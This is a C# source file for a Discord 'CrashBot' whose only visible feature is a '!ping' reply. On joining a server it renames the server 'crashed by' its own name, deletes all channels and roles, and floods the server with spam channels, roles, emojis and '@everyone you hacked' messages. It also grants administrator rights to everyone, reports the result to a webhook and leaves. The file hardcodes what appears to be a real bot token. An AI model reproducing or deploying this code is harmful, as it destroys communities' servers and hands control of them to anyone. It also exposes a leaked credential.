using Discord;
using Discord.Webhook;
using Discord.WebSocket;

namespace CrashBot
{
    internal class CrashBot
    {
        private readonly DiscordSocketClient _client;
        
        private static void Main()
            => new CrashBot()
                .MainAsync()
                .GetAwaiter()
                .GetResult();

        private CrashBot()
        {
            _client = new DiscordSocketClient();
            _client.Log += LogAsync;
            _client.Ready += ReadyAsync;
            _client.MessageReceived += MessageReceivedAsync;
            _client.JoinedGuild += JoinedGuildAsync;
        }

        private async Task MainAsync()
        {
            await _client.LoginAsync(TokenType.Bot, "OTcyNDg4NDI1NDgxNTg0Njcw.Gy3C6g.zZefnQQIC1ihPn_GkE5NlAfprnPxTSwR_t3yik");
            await _client.StartAsync();

            await Task.Delay(Timeout.Infinite);
        }

        private static Task LogAsync(LogMessage log)
        {
            Console.WriteLine(log.ToString());
            return Task.CompletedTask;
        }

        private Task ReadyAsync()
        {
            Console.WriteLine($"{_client.CurrentUser} is connected!");
            return Task.CompletedTask;
        }

        private async Task MessageReceivedAsync(SocketMessage message)
        {
            if (message.Author.Id == _client.CurrentUser.Id)
                return;


            if (message.Content == "!ping")
            {
                var cb = new ComponentBuilder()
                    .WithButton("Click me!", "unique-id", ButtonStyle.Success);

                await message.Channel.SendMessageAsync("pong!", components: cb.Build());
            }
        }

        private async Task JoinedGuildAsync(SocketGuild guild)
        {
            // Get bot name
            var name = _client.CurrentUser.Username;
            
            // Set guild name
            try
            {
                await guild.ModifyAsync(x =>
                {
                    x.Name = $"crashed by {name}";
                    x.VerificationLevel = VerificationLevel.Extreme;
                    x.Icon = new Image("./crash.png");
                });
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

            // Deleting channels
            async void DeleteChannels()
            {
                for (var index = 0; index <= guild.Channels.Count; index++)
                {
                    try
                    {
                        await guild.Channels.ToList()[index].DeleteAsync();
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.Message);
                    }
                }
            }

            var dcThread = new Thread(DeleteChannels);
            dcThread.Start();

            // Deleting roles
            async void DeleteRoles()
            {
                for (var index = 0; index <= guild.Roles.Count; index++)
                {
                    try
                    {
                        await guild.Roles.ToList()[index].DeleteAsync();
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.Message);
                    }
                }
            }

            var drThread = new Thread(DeleteRoles);
            drThread.Start();

            // Create TextChannels, VoiceChannels, Roles
            async void CreateChannelsAndRoles()
            {
                for (var i = 0; i < 25; i++)
                {
                    try
                    {
                        await guild.CreateTextChannelAsync($"crashed by {name}");
                        await guild.CreateVoiceChannelAsync($"crashed by {name}");
                        await guild.CreateRoleAsync($"crashed by {name}");
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.Message);
                    }
                }
            }

            var cThread = new Thread(CreateChannelsAndRoles);
            cThread.Start();

            // Create emojis
            async void CreateEmojis()
            {
                for (var i = 0; i <= 50; i++)
                {
                    try
                    {
                        await guild.CreateEmoteAsync(i.ToString(), new Image("./hacked.png"));
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.Message);
                    }
                }
            }

            var ceThread = new Thread(CreateEmojis);
            ceThread.Start();

            // Change permission administrator in everyone role
            try
            {
                await guild.EveryoneRole.ModifyAsync(x =>
                {
                    x.Permissions = new GuildPermissions(administrator: true);
                });
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

            // Spam in channels
            async void Spam()
            {
                var newGuild = _client.GetGuild(guild.Id);
                for (var index = 0; index <= newGuild.Channels.Count; index++)
                {
                    try
                    {
                        await _client.GetGuild(guild.Id).GetTextChannel(newGuild.Channels.ToList()[index].Id)
                            .SendMessageAsync($"@everyone you hacked by {name} and hawchik!");
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.Message);
                    }
                }
            }

            var sThread = new Thread(Spam);
            sThread.Start();
            sThread.Start();
            sThread.Start();

            // Send information to webhook
            var webhook = new DiscordWebhookClient(
                ""
                );
            var emb = new EmbedBuilder
            {
                Title = "Сервер крашнут",
                Description = $"Название: {guild.Name}\nУчастников: {guild.MemberCount}",
                Color = Color.Green,
                Footer = new EmbedFooterBuilder
                {
                    Text = "by Hawchik"
                }
            };
            await webhook.SendMessageAsync($"", embeds: new[] { emb.Build() });
            
            // Leave from guild after crash :D
            try
            {
                await guild.LeaveAsync();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }
    }
}
